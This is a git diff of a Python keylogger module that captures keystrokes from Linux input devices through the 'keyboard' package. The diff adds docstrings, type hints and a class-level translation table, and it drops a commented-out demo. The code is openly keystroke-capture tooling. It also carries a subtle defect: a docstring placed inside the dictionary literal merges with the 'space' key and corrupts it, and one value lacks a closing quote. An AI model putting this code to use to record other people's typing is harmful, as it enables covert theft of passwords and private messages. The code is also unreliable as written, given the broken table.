@@ -1,25 +1,48 @@
+"""
+    This module contains the Keylogger class which is used to capture keystrokes.
+"""
+
+
 from sys import stderr
 from threading import Thread, Lock
 import keyboard
 import time
 
-# Translation Table
-TRANSLATION_TABLE = {
-    "space":" ",
-    "ctrl":"'CTRL'",
-    "shift":"'SHIFT",
-    "tab":"'TAB'",
-    "enter":"'ENTER'",
-    "backspace":"\b",
-    "alt":"'ALT'"
-}
-
 
 class Keylogger:
+    """
+        The Keylogger class is a wrapper around the keyboard module (https://pypi.org/project/keyboard/).
+        It has methods for starting, stopping, and retreiving the contents of a keylogger.
+        It reads keystrokes directly from the /dev/input files on the Linux filesystem.
+        It is therefore only compatible with Linux.
+    """
 
+    TRANSLATION_TABLE = {
+    """
+        A translation table used for translating certain keyboard events
+        into a different format.
+    """
+        "space":" ",
+        "ctrl":"'CTRL'",
+        "shift":"'SHIFT",
+        "tab":"'TAB'",
+        "enter":"'ENTER'",
+        "backspace":"\b",
+        "alt":"'ALT'"
+    }
 
     def __init__(self):
-        # This stores every key press.
+        """
+            Constructor method for the Keylogger class.
+
+            Parameters
+            ----------
+            None
+
+            Returns
+            -------
+            An instance of a Keylogger object.
+        """
         self.__keylog = ""
         self.__active = False
         self.__stop = False
@@ -44,6 +67,22 @@ class Keylogger:
 
 
     def start(self) -> bool:
+        """
+            Starts the keylogger.
+
+            Attempts to start the keylogger. If the keylogger is already in a running state,
+            then this function will do nothing and return False. If the keylogger is not in a running
+            state, then this function will start the keylogger and return True.
+
+            Parameters
+            ----------
+            None
+
+            Returns
+            -------
+            bool - True on success, False on failure.
+                        
+        """
         if self.__active:
             return False
         self.__active = True
@@ -53,13 +92,42 @@ class Keylogger:
 
 
     def stop(self) -> bool:
+        """
+            Stops the keylogger.
+
+            Attempts to stop the keylogger. If the keylogger is not in an active state,
+            then this function will do nothing and return False. If the keylogger is in an active state,
+            then this function will stop the keylogger and return True.
+
+            Parameters
+            ----------
+            None
+
+            Returns
+            -------
+            bool - True on success, False on failure.
+        """
         if not self.__active:
             return False
         self.__stop = True
         self.__active = False
         return True
 
-    def get_keylog(self):
+    def get_keylog(self) -> str:
+        """
+            Returns the contents of the keylogger.
+
+            Uses threading locks to access the internal keystroke data
+            and return it's contents in a thread-safe manner.
+
+            Parameters
+            ----------
+            None
+
+            Returns
+            -------
+            str - the contents of the keylogger as a string.
+        """
         keylog = ""
         self.__lock.acquire()
         keylog = self.__keylog
@@ -67,17 +135,21 @@ class Keylogger:
         return keylog
     
 
-    def clear_keylog(self):
+    def clear_keylog(self) -> None:
+        """
+            Clears the keylogger.
+
+            Uses threading locks to access the internal keystroke data and clears
+            the keystroke buffer in a thread-safe manner.
+
+            Parameters
+            ----------
+            None
+
+            Returns
+            -------
+            None
+        """
         self.__lock.acquire()
         self.__keylog = ""
         self.__lock.release()
-    
-
-# if __name__ == "__main__":
-#     k = Keylogger()
-#     k.start()
-#     time.sleep(15)
-#     k.stop()
-#     print(f"Before: {k.get_keylog()}")
-#     k.clear_keylog()
-#     print(f"After: {k.get_keylog()}")
